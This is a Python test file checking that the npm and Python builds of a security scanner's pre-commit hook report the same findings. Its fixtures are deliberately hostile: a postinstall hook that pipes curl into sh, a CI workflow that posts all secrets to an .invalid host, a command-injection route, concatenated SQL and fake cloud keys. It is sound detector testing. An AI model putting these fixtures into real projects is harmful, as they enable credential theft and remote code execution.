"""`lazaret hook` in both packages: the npm package's (js/src/hook.js, H-2) and
the Python package's (lazaret.scanner.hook, H-1) check the same files and print
the same lines, with the same exit code.

Each case stages files in a temporary git repository and runs both commands
there: with no file named (the staged files), with -q, and with the files
named as pre-commit names them. The credentials are built from parts, hosts
are .invalid, and nothing runs but git. Skipped where node, the npm engine's
WebAssembly build or git is missing.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

from tests.architecture.test_js_parity import JS_BIN, NPM_READY, NPM_SKIP

GIT = shutil.which("git")
AWS_KEY = "AKIA" + "Q3EGRSWJ" + "ZTB7XF2N"
STRIPE = "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"
HOOK_DOWNLOADS = json.dumps({"name": "x", "version": "1.0.0",
                             "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}) + "\n"
WORKFLOW = ("on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n")
FLOW_ROUTE = ("const express = require('express');\nconst { run } = require('./lib/run');\n"
              "const app = express();\napp.get('/x', (req, res) => { run(req.query.cmd); res.send('ok'); });\n")
FLOW_SINK = ("const cp = require('child_process');\n"
             "function run(cmd) {\n  return cp.execSync(cmd);\n}\nmodule.exports = { run };\n")
SQL = ("import sqlite3\n\ndef find(db, name):\n    cur = db.cursor()\n"
       "    cur.execute(\"SELECT * FROM users WHERE name = '\" + name + \"'\")\n    return cur.fetchall()\n")

#: name -> {path: text}; a value None is a symbolic link to a file outside the repository
CASES = {
    "credential": {"settings.py": f"AWS_ACCESS_KEY_ID = '{AWS_KEY}'\n",
                   "util.py": "def add(a, b):\n    return a + b\n"},
    "worm": {"package.json": HOOK_DOWNLOADS, ".github/workflows/ci.yml": WORKFLOW},
    "clean": {"a.py": "x = 1\n", "README.md": "# x\n", "src/app.js": "module.exports = (a, b) => a + b;\n"},
    "dependency folders": {"node_modules/x/settings.py": f"KEY = '{AWS_KEY}'\n",
                           "vendor/package.json": '{"name": "y"}\n',
                           "vendor/y/settings.py": f"KEY = '{AWS_KEY}'\n",
                           "node_modules/x/package.json": HOOK_DOWNLOADS},
    "a cross-file flow": {"app.js": FLOW_ROUTE, "lib/run.js": FLOW_SINK},
    "config and odd names": {"deploy keys/prod ü.env": f"STRIPE_KEY={STRIPE}\n", "db/find.py": SQL},
    "a link only": {"link.py": None},
}
if os.name != "nt":
    CASES["two names, one file"] = {"a/b.py": f"KEY = '{AWS_KEY}'\n", "a\\b.py": "KEY = None\n"}


def run(cmd, cwd):
    p = subprocess.run(cmd, cwd=cwd, capture_output=True, encoding="utf-8", errors="replace", timeout=60)
    return p.returncode, p.stdout, p.stderr


@unittest.skipUnless(NPM_READY, NPM_SKIP)
@unittest.skipUnless(GIT, "git is not installed")
class HookParityTests(unittest.TestCase):
    def setUp(self):
        self.outside = tempfile.mkdtemp(prefix="lz-hookp-out-")
        self.addCleanup(shutil.rmtree, self.outside, True)
        with open(os.path.join(self.outside, "secret.py"), "w", encoding="utf-8") as f:
            f.write(f"KEY = '{AWS_KEY}'\n")

    def repo(self, files):
        d = os.path.realpath(tempfile.mkdtemp(prefix="lz-hookp-"))
        self.addCleanup(shutil.rmtree, d, True)
        git = lambda *args: subprocess.run([GIT, "-C", d, *args], check=True, capture_output=True)
        git("init", "-q")
        git("config", "user.email", "t@x.invalid")
        git("config", "user.name", "t")
        git("config", "core.autocrlf", "false")
        for rel, text in files.items():
            path = os.path.join(d, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            if text is None:
                os.symlink(os.path.join(self.outside, "secret.py"), path)
            else:
                with open(path, "w", encoding="utf-8", newline="\n") as f:
                    f.write(text)
            git("--literal-pathspecs", "add", "-f", "--", rel)
        return d

    def test_both_packages_print_the_same(self):
        outs = {}
        for name, files in CASES.items():
            if None in files.values() and os.name == "nt":
                continue                                    # (no symbolic links to make here)
            d = self.repo(files)
            variants = [[], list(files)] + ([["-q"]] if name in ("credential", "clean") else [])
            for extra in variants:
                with self.subTest(case=name, args=extra):
                    py = run([sys.executable, "-m", "lazaret", "hook", *extra], d)
                    js = run([NPM_READY, JS_BIN, "hook", *extra], d)
                    self.assertEqual(js, py)
                    self.assertIn(py[0], (0, 1), py)
                    outs.setdefault(name, py)
        # the cases are what they say: findings of each kind, and no finding
        self.assertIn("[S-TOKEN]", outs["credential"][1])
        self.assertIn("[SC-WORKFLOW-SECRETS]", outs["worm"][1])
        self.assertIn("  node_modules/x/settings.py\n", outs["dependency folders"][1])
        self.assertIn("[X-", outs["a cross-file flow"][1])
        self.assertIn("  db/find.py\n", outs["config and odd names"][1])
        self.assertEqual(outs["clean"], (0, "lazaret hook: 3 files checked\n  Commit gate:  PASSED \n", ""))
        for name in ("credential", "worm", "dependency folders", "a cross-file flow", "config and odd names"):
            self.assertEqual(outs[name][0], 1, name)
        if "a link only" in outs:
            self.assertEqual(outs["a link only"], (0, "lazaret hook: nothing to check\n", ""))
        if "two names, one file" in outs:
            self.assertIn("so it could not be copied for the scan.", outs["two names, one file"][1])

    def test_usage_errors_alike(self):
        d = self.repo({"a.py": "x = 1\n"})
        os.mkdir(os.path.join(d, "folder"))
        for args in (["folder"], ["gone.py"], [os.path.join(os.pardir, "x.py")]):
            with self.subTest(args=args):
                py = run([sys.executable, "-m", "lazaret", "hook", *args], d)
                js = run([NPM_READY, JS_BIN, "hook", *args], d)
                self.assertEqual((js[0], js[2]), (py[0], py[2]))
                self.assertEqual(py[0], 2)


if __name__ == "__main__":
    unittest.main()
